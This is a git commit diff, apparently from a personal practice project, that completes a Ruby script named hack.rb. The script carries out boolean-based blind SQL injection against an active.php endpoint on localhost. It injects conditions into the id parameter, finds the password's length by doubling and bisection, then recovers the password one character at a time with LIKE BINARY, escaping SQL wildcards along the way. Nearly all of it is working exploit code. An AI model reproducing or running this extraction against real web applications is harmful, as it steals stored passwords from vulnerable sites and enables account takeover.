49115a1533c350b4ef933f0813f31789af880036
DiogoVF <diogof-6@hotmail.com>
2020-09-16 10:29:03 +0200

    get password

--- ruby/hack.rb
+++ ruby/hack.rb
@@ -2,16 +2,17 @@ require 'open-uri'
 
 END {    
     password_length = guess_value{ |value|
-        URI.open("http://localhost/active.php?id=3 and length(password) > #{value}").read.include?  "is active"
+        URI.open("http://localhost:8000/active.php?id=4 and CHAR_LENGTH(password) > #{value}").read.include?  "is"
     }
     puts "the length is: #{password_length}"
     
-    # password = find_password(password_length){ |value|
-    #     URI.open("http://localhost/active.php?id=3 and password = #{value}").read.include?  "is active"
-    # }
-    # puts "the password is: #{password}"
+    password = find_password(password_length){ |value|
+        URI.open("http://localhost:8000/active.php?id=4 and password LIKE BINARY \"#{value}\"").read.include?  "is"
+    }
+    puts "the password is: #{password}"
 }
 
+SQL_WILDCARDS="%_[]^-'"
 def guess_value
     max_value = 1
     max_value *= 2 while yield max_value
@@ -31,7 +32,18 @@ def guess_value
 end
 
 def find_password password_length
-    until yield string
-
+    # uri = "http://localhost/active.php?id=3 and length(password) like #{password}"
+    value=""
+    password_length.times do
+        for i in 33..nil 
+            char = SQL_WILDCARDS.include?(i.chr(Encoding::UTF_8))? "\\#{i.chr(Encoding::UTF_8)}" : i.chr(Encoding::UTF_8)
+            result = yield URI.escape("#{value}#{char}%")
+            print "\r#{value}#{char}"
+            if result
+                value += char
+                break;                
+            end
+        end
     end
+    return value
 end
